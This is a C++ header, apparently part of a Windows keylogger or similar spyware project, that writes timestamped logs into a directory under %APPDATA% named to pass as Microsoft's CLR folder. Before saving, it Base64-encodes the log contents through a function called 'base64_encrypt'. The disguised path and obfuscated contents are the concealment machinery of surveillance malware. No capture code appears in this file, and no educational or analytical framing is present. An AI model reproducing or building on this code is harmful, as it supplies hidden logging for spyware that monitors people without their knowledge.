#ifndef IO_H_INCLUDED
#define IO_H_INCLUDED

#include <string>
#include <cstdlib>
#include <fstream>
#include "windows.h"
#include "helper.h"
#include "base64.h"


namespace IO
{
    //gets the path of where the log is going to be stored
    std::string GetOurPath(const bool append_seperator = false)
    {
        std::string appdata_dir(getenv("APPDATA"));
        std::string full=appdata_dir + "\\Microsoft\\CLR";
        return full + (append_seperator ? "\\" : "");

    }

    //creates the directory
    bool MkOneDr(std::string path)
    {
        return (bool)CreateDirectory(path.c_str(), NULL) ||
        GetLastError() == ERROR_ALREADY_EXISTS;
    }

    //if any folder in the specified path is absent, it creates
    //it along the way
    //we will use this function to create a directory
    bool MKDir(std::string path)
    {
        for(char &c : path)
        {
            if(c == '\\')
            {
                c = '\0';
                if(!MkOneDr(path))
                {
                    return false;
                }
                c='\\';
            }
        }
        return true;
    }


    template <class T>
    std::string WriteLog(const T &t)
    {
        std::string path = GetOurPath(true);
        Helper::DateTime dt;
        std::string name = dt.GetDateTimeString() + ".log";
        try
        {
            std::ofstream file(path + name);
            if(!file) return "";
            std::ostringstream s;
            s << "[" << dt.GetDateTimeString() << "]" <<
            std::endl << t <<std::endl;
            std::string data = Base64::base64_encrypt(s.str());
            file<<data;
            if(!file)
            {
                return "";
            }
            file.close();
            return name;
        }
        catch(...)
        {
            return "";
        }
    }
}

#endif // IO_H_INCLUDED
